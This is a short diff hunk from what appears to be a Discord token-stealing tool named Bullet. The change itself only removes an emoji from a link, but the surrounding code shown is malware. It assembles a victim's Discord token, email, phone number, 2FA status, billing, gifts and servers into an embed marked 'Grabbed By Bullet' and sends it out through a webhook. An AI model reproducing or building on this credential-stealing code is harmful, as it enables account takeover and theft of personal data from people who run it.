@@ -221,7 +221,7 @@ def getDcToken():
         embed.set_title(f"**Discord Information** : `{username}`")
         embed.set_image(avatar)
         embed.set_description(
-            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Bullet-Multi-Tool)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
+            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github](https://github.com/AquaLT/Bullet-Multi-Tool)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
         embed.set_footer("Grabbed By Bullet")
 
         webhook.execute()
